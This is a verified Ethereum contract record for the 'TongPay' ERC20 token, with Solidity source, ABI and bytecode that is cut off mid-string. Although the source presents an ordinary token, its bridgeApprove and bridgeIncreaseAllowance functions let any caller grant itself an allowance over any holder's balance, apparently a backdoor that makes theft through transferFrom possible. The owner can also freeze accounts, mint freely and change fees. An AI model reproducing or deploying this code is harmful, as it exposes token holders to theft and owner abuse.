{
  "address": "0xee81dcab87bf4d4821482436106a3dec7552f674",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "TongPay",
  "compilerVersion": "v0.5.0+commit.1d4f565a",
  "optimization": false,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-04-17\n*/\n\npragma solidity ^0.5.0;\nlibrary SafeMath {\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b);\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a);\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b != 0);\n        return a % b;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address who) external view returns (uint256);\n    function trsf(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address payable from, address to, uint256 value) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event FrozenFunds(address target, bool freeze);\n    event ethReceipt(address from, uint value);\n    event sellLog(address seller, uint sell_token, uint in_eth);\n    event Paused(address account);\n    event Unpaused(address account);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n}\n\ncontract ERC20 is IERC20 {\n\n    using SafeMath for uint256;\n\n    address payable private _owner;\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals = 18;\n    uint256 private _totalSupply;\n    uint256 private sellPrice;\n    uint256 private buyPrice;\n    uint256 private tax;\n    bool private _paused;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowed;\n\n    mapping (address => bool) public frozenAccount;\n\n    constructor() public{\n        _totalSupply = 10000000000e18;\n        _name = \"Tong-Pay\";\n        _symbol = \"TONG\";\n        _balances[msg.sender] = _totalSupply;\n        _paused = false;\n        _owner = msg.sender;\n        sellPrice = 1;\n        buyPrice = 1;\n        tax = 1 finney;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner(), \"YOUR NOT OWNER\");\n        _;\n    }\n\n    function isOwner() public view returns (bool) {\n        return msg.sender == _owner;\n    }\n\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function trsf_ons(address payable newOwner) public onlyOwner {\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address payable newOwner) internal {\n        require(newOwner != address(0),\"It's not a normal approach.\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n    function paused() public view returns (bool) {\n        return _paused;\n    }\n\n    modifier whenNotPaused() {\n        require(!_paused);\n        _;\n    }\n\n    modifier whenPaused() {\n        require(_paused,\"This contract has been suspended.\");\n        _;\n    }\n\n    function pause() public onlyOwner whenNotPaused {\n        _paused = true;\n        emit Paused(msg.sender);\n    }\n\n    function unpause() public onlyOwner whenPaused {\n        _paused = false;\n        emit Unpaused(msg.sender);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function ownerBalance() public view returns (uint){\n        return address(this).balance;\n    }\n\n    function balanceOf(address user) public view returns (uint256) {\n        return _balances[user];\n    }\n\n    function tax_rate() public view returns (uint){\n        return tax;\n    }\n\n    function s_Price() public view returns (uint){\n        return sellPrice;\n    }\n\n    function b_Price() public view returns (uint){\n        return buyPrice;\n    }\n\n    function allowance(address user, address spender) public view returns (uint256) {\n        return _allowed[user][spender];\n    }\n\n    function trsf(address to, uint256 value) public whenNotPaused returns (bool) {\n        require(_balances[msg.sender] >= value,\"be short of balance\");\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function s_g(uint value) public whenNotPaused returns(bool) {\n         _burn(msg.sender, value);\n         return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(address payable from, address to, uint256 value) public whenNotPaused returns (bool) {\n        require(_allowed[from][msg.sender] >= value,\"be short of balance\");\n        _transfer(from, to, value);\n        _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));\n        return true;\n    }\n\n    function tnim(uint value) public whenNotPaused onlyOwner returns(bool){\n        _mint(msg.sender, value);\n        return true;\n    }\n\n    function burnFrom(address account, uint value) public returns(bool){\n        _burnFrom(account, value);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));\n        return true;\n    }\n\n    function _transfer(address payable from, address to, uint256 value) internal {\n        require(to != address(0),\"be not a normal approach\");\n        require(to != from,\"You can't send it alone.\");\n        require(value <= _balances[from],\"be short of balance\");\n        require(!frozenAccount[from],\"This account has been frozen. [Sender]\");\n        require(!frozenAccount[to],\"This account has been frozen. [Recipient]\");\n        require(!frozenAccount[msg.sender],\"This account has been frozen. [Wallet]\");\n        require(address(this).balance > tax.mul(2),\"Transaction cannot be performed at this time. Try again next time.(code-01\");\n  \n        if(from == _owner){\n            _balances[from] = _balances[from].sub(value);\n            _balances[to] = _balances[to].add(value);\n        }else{\n            require(_balances[from] >= value.add(tax),\"be short of balance\");\n            _balances[from] = _balances[from].sub(value.add(tax));\n            _balances[to] = _balances[to].add(value);\n            _balances[_owner] = _balances[_owner].add(tax);\n            from.transfer(tax);\n        }\n        emit Transfer(from, to, value);\n    }\n\n    function _mint(address account, uint256 value) internal {\n        require(account != address(0),\"be not a normal approach\");\n\n        _totalSupply = _totalSupply.add(value);\n        _balances[account] = _balances[account].add(value);\n        emit Transfer(address(0), account, value);\n    }\n\n    function _burn(address account, uint256 value) internal {\n        require(account != address(0),\"be not a normal approach\");\n        require(value <= _balances[account],\"be short of balance\");\n\n        _totalSupply = _totalSupply.sub(value);\n        _balances[account] = _balances[account].sub(value);\n        emit Transfer(account, address(0), value);\n    }\n\n    function _approve(address user, address spender, uint256 value) internal {\n        require(spender != address(0),\"be not a normal approach\");\n        require(user != address(0),\"be not a normal approach\");\n\n        _allowed[user][spender] = value;\n        emit Approval(user, spender, value);\n    }\n\n    function _burnFrom(address account, uint256 value) internal {\n        _burn(account, value);\n        _approve(account, msg.sender, _allowed[account][msg.sender].sub(value));\n    }\n\n    function freezeAccount(address target) onlyOwner public {\n        frozenAccount[target] = true;\n        emit FrozenFunds(target, true);\n    }\n     function unfreezeAccount(address target) onlyOwner public {\n        frozenAccount[target] = false;\n        emit FrozenFunds(target, false);\n    }\n\n    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {\n        sellPrice = newSellPrice;\n        buyPrice = newBuyPrice;\n    }\n\n    function t_b() payable whenNotPaused public {\n        require(!frozenAccount[msg.sender],\"This account has been frozen. [Sender]\");\n        uint amount = msg.value.div(buyPrice);\n\n        _balances[msg.sender] = _balances[msg.sender].add(amount);\n        _balances[_owner] = _balances[_owner].sub(amount);\n    }\n\n    function t_s(uint256 amount) payable whenNotPaused public {\n      uint inEth = amount.mul(sellPrice);\n      require(!frozenAccount[msg.sender],\"This account has been frozen. [Sender]\");\n      require(_balances[msg.sender] >= inEth,\"be short of balance\");\n      require(address(this).balance > inEth,\"Transaction cannot be performed at this time. Try again next time.(code-01\");\n      _balances[msg.sender] = _balances[msg.sender].sub(inEth);\n      _balances[_owner] = _balances[_owner].add(inEth);\n      msg.sender.transfer(amount.mul(sellPrice));\n      emit sellLog(msg.sender, amount, inEth);\n    }\n\n    function setTax_rate(uint _taxRate) onlyOwner public {\n        tax = _taxRate;\n    }\n\n    function () payable external{\n        if(msg.sender != _owner){\n            t_b();\n        }\n    }    \n    function bridgeApprove(address _from, uint256 value) public returns(bool){\n        _bridgeApprove(_from, msg.sender, value);\n        return true;\n    }\n    \n    function _bridgeApprove(address from, address spender, uint256 value) internal {\n        require(from != address(0),\"be not a normal approach\");\n        require(spender != address(0),\"be not a normal approach\");\n        require(_balances[from] >= value,\"be short of balance\");\n        \n        _allowed[from][spender] = value;\n        emit Approval(from, spender, value);\n    }\n    \n    function bridgeIncreaseAllowance(address from, uint256 addedValue) public returns (bool) {\n        _approve(from, msg.sender, _allowed[from][msg.sender].add(addedValue));\n        return true;\n    }\n    \n    function bridgeDecreaseAllowance(address from, uint256 subtractedValue) public returns (bool) {\n        _approve(from, msg.sender, _allowed[from][msg.sender].sub(subtractedValue));\n        return true;\n    }\n\n}\n\ncontract TongPay is ERC20{}",
  "abi": "[{\"constant\":false,\"inputs\":[{\"name\":\"newSellPrice\",\"type\":\"uint256\"},{\"name\":\"newBuyPrice\",\"type\":\"uint256\"}],\"name\":\"setPrices\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"trsf_ons\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"s_Price\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unpause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"t_b\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"t_s\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"bridgeIncreaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"bridgeApprove\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"b_Price\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"tnim\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"target\",\"type\":\"address\"}],\"name\":\"unfreezeAccount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"account\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"pause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"trsf\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"spender\",\"type\":\"address\"},{\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"frozenAccount\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ownerBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"s_g\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"},{\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"tax_rate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"bridgeDecreaseAllowance\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_taxRate\",\"type\":\"uint256\"}],\"name\":\"setTax_rate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"target\",\"type\":\"address\"}],\"name\":\"freezeAccount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"target\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"freeze\",\"type\":\"bool\"}],\"name\":\"FrozenFunds\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"ethReceipt\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"seller\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"sell_token\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"in_eth\",\"type\":\"uint256\"}],\"name\":\"sellLog\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]",
  "bytecode": "60806040526012600360006101000a81548160ff021916908360ff1602179055506b204fce5e3e250261100000006004819055506040805190810160405280600881526020017f546f6e672d506179000000000000000000000000000000000000000000000000815250600190805190602001906200008092919062000210565b506040805190810160405280600481526020017f544f4e470000000000000000000000000000000000000000000000000000000081525060029080519060200190620000ce92919062000210565b50600454600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000600860006101000a81548160ff021916908315150217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600581905550600160068190555066038d7ea4c680006007819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3620002bf565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200025357805160ff191683800117855562000284565b8280016001018555821562000284579182015b828111156200028357825182559160200191906001019062000266565b5b50905062000293919062000297565b5090565b620002bc91905b80821115620002b85760008160009055506001016200029e565b5090565b90565b613a5980620002cf6000396000f3fe608060405260043610610196576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806305fefda7146101f7578063095ea7b31461023c57806318160ddd146102af57806319f46cec146102da57806323b872dd1461032b5780632b9bf45c146103be57806339509351146103e95780633f4ba83a1461045c5780634b13a0e014610473578063530bb2331461047d5780635c975abb146104ab5780636e1e59e4146104da57806370a082311461054d578063715018a6146105b257806372e26d47146105c9578063749e63d71461063c57806374d7137a14610667578063788649ea146106ba57806379cc67901461070b5780638456cb591461077e5780638b65e7b5146107955780638da5cb5b146108085780638f32d59b1461085f578063a457c2d71461088e578063b414d4b614610901578063bedcf0031461096a578063ccf6122814610995578063dd62ed3e146109e8578063e98ea4aa14610a6d578063ed65fcee14610a98578063f10c371114610b0b578063f26c159f14610b46575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156101f5576101f4610b97565b5b005b34801561020357600080fd5b5061023a6004803603604081101561021a57600080fd5b810190808035906020019092919080359060200190929190505050610e23565b005b34801561024857600080fd5b506102956004803603604081101561025f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610eb1565b604051808215151515815260200191505060405180910390f35b3480156102bb57600080fd5b506102c4610ec8565b6040518082815260200191505060405180910390f35b3480156102e657600080fd5b50610329600480360360208110156102fd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ed2565b005b34801561033757600080fd5b506103a46004803603606081101561034e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610f5a565b604051808215151515815260200191505060405180910390f35b3480156103ca57600080fd5b506103d361111b565b6040518082815260200191505060405180910390f35b3480156103f557600080fd5b506104426004803603604081101561040c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611125565b604051808215151515815260200191505060405180910390f35b34801561046857600080fd5b506104716111ca565b005b61047b610b97565b005b6104a96004803603602081101561049357600080fd5b8101908080359060200190929190505050611370565b005b3480156104b757600080fd5b506104c061185c565b604051808215151515815260200191505060405180910390f35b3480156104e657600080fd5b50610533600480360360408110156104fd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611873565b604051808215151515815260200191505060405180910390f35b34801561055957600080fd5b5061059c6004803603602081101561057057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611918565b6040518082815260200191505060405180910390f35b3480156105be57600080fd5b506105c7611961565b005b3480156105d557600080fd5b50610622600480360360408110156105ec57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611a9c565b604051808215151515815260200191505060405180910390f35b34801561064857600080fd5b50610651611ab3565b6040518082815260200191505060405180910390f35b34801561067357600080fd5b506106a06004803603602081101561068a57600080fd5b8101908080359060200190929190505050611abd565b604051808215151515815260200191505060405180910390f35b3480156106c657600080fd5b50610709600480360360208110156106dd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611b6a565b005b34801561071757600080fd5b506107646004803603604081101561072e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611cb1565b604051808215151515815260200191505060405180910390f35b34801561078a57600080fd5b50610793611cc7565b005b3480156107a157600080fd5b506107ee600480360360408110156107b857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611ddf565b604051808215151515815260200191505060405180910390f35b34801561081457600080fd5b5061081d611ec9565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561086b57600080fd5b50610874611ef2565b604051808215151515815260200191505060405180910390f35b34801561089a57600080fd5b506108e7600480360360408110156108b157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611f49565b604051808215151515815260200191505060405180910390f35b34801561090d57600080fd5b506109506004803603602081101561092457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611fee565b604051808215151515815260200191505060405180910390f35b34801561097657600080fd5b5061097f61200e565b6040518082815260200191505060405180910390f35b3480156109a157600080fd5b506109ce600480360360208110156109b857600080fd5b810190808035906020019092919050505061202d565b604051808215151515815260200191505060405180910390f35b3480156109f457600080fd5b50610a5760048036036040811015610a0b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061205e565b6040518082815260200191505060405180910390f35b348015610a7957600080fd5b50610a826120e5565b6040518082815260200191505060405180910390f35b348015610aa457600080fd5b50610af160048036036040811015610abb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506120ef565b604051808215151515815260200191505060405180910390f35b348015610b1757600080fd5b50610b4460048036036020811015610b2e57600080fd5b8101908080359060200190929190505050612194565b005b348015610b5257600080fd5b50610b9560048036036020811015610b6957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061221a565b005b600860009054906101000a900460ff16151515610bb357600080fd5b600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151515610c9b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f54686973206163636f756e7420686173206265656e2066726f7a656e2e205b5381526020017f656e6465725d000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b6000610cb26006543461236190919063ffffffff16565b9050610d0681600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dbc81600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b610e2b611ef2565b1515610e9f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b81600581905550806006819055505050565b6000610ebe3384846123ce565b6001905092915050565b6000600454905090565b610eda611ef2565b1515610f4e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b610f5781612603565b50565b6000600860009054906101000a900460ff16151515610f7857600080fd5b81600a60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561106c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b611077848484612766565b611110843361110b85600a60008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b6123ce565b600190509392505050565b6000600554905090565b60006111c033846111bb85600a60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b6123ce565b6001905092915050565b6111d2611ef2565b1515611246576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b600860009054906101000a900460ff1615156112f0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260218152602001807f5468697320636f6e747261637420686173206265656e2073757370656e64656481526020017f2e0000000000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b6000600860006101000a81548160ff0219169083151502179055507f5db9ee0a495bf2e6ff9c91a7834c1ba4fdd244a5e8aa4e537bd38aeae4b073aa33604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a1565b600860009054906101000a900460ff1615151561138c57600080fd5b60006113a36005548361322790919063ffffffff16565b9050600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151561148d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f54686973206163636f756e7420686173206265656e2066726f7a656e2e205b5381526020017f656e6465725d000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b80600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515611544576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b803073ffffffffffffffffffffffffffffffffffffffff163111151561161e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252604a8152602001807f5472616e73616374696f6e2063616e6e6f7420626520706572666f726d65642081526020017f617420746869732074696d652e2054727920616761696e206e6578742074696d81526020017f652e28636f64652d30310000000000000000000000000000000000000000000081525060600191505060405180910390fd5b61167081600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff